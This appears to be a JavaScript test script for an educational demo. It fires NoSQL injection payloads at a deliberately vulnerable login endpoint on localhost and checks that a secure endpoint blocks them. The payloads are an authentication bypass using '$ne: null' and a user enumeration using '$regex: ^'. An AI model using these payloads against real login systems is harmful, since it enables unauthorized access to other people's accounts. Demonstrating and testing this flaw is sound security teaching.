// NoSQL Injection Test Script
// Run this after starting your backend server

const API_URL = "http://localhost:4000";

console.log("🧪 NoSQL Injection Demonstration Test Suite\n");
console.log("⚠️  Make sure your backend server is running on port 4000\n");

// Test 1: Vulnerable Endpoint - Normal Login
async function testNormalLogin() {
  console.log("📝 Test 1: Normal login on vulnerable endpoint...");

  const response = await fetch(`${API_URL}/auth/login-vulnerable`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: "test@example.com",
      password: "password123",
    }),
  });

  const data = await response.json();
  console.log(`   Status: ${response.status}`);
  console.log(`   Result: ${data.message || "Success"}\n`);
}

// Test 2: NoSQL Injection Attack - Authentication Bypass
async function testNoSQLInjection() {
  console.log("💥 Test 2: NoSQL Injection Attack (Authentication Bypass)...");
  console.log(
    '   Payload: {"email": {"$ne": null}, "password": {"$ne": null}}'
  );

  const response = await fetch(`${API_URL}/auth/login-vulnerable`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: { $ne: null },
      password: { $ne: null },
    }),
  });

  const data = await response.json();
  console.log(`   Status: ${response.status}`);

  if (response.ok) {
    console.log(`   ⚠️  VULNERABLE! Logged in as: ${data.email}`);
    console.log(`   User ID: ${data.id}`);
    console.log(`   Name: ${data.fullName}\n`);
  } else {
    console.log(`   Result: ${data.message}\n`);
  }
}

// Test 3: Secure Endpoint - Same Attack Should Fail
async function testSecureEndpoint() {
  console.log("🛡️  Test 3: Same attack on SECURE endpoint...");
  console.log(
    '   Payload: {"email": {"$ne": null}, "password": {"$ne": null}}'
  );

  const response = await fetch(`${API_URL}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: { $ne: null },
      password: { $ne: null },
    }),
  });

  const data = await response.json();
  console.log(`   Status: ${response.status}`);

  if (response.ok) {
    console.log(`   ⚠️  STILL VULNERABLE!`);
  } else {
    console.log(`   ✅ SECURE! Attack blocked: ${data.message}\n`);
  }
}

// Test 4: Regex Injection Attack
async function testRegexInjection() {
  console.log("🔍 Test 4: Regex-based user enumeration attack...");
  console.log(
    '   Payload: {"email": {"$regex": "^"}, "password": {"$ne": null}}'
  );

  const response = await fetch(`${API_URL}/auth/login-vulnerable`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: { $regex: "^" },
      password: { $ne: null },
    }),
  });

  const data = await response.json();
  console.log(`   Status: ${response.status}`);

  if (response.ok) {
    console.log(`   ⚠️  VULNERABLE! Found user: ${data.email}\n`);
  } else {
    console.log(`   Result: ${data.message}\n`);
  }
}

// Run all tests
async function runAllTests() {
  try {
    // Uncomment if you have a test user
    // await testNormalLogin();

    await testNoSQLInjection();
    await testSecureEndpoint();
    await testRegexInjection();

    console.log("✅ Test suite completed!");
    console.log("\n📚 See NOSQL_INJECTION_DEMO.md for detailed documentation");
  } catch (error) {
    console.error("❌ Error running tests:", error.message);
    console.log("\nMake sure:");
    console.log("1. Backend server is running (npm run dev in server/)");
    console.log("2. Server is accessible at http://localhost:4000");
    console.log("3. At least one user exists in the database");
  }
}

// Execute
runAllTests();
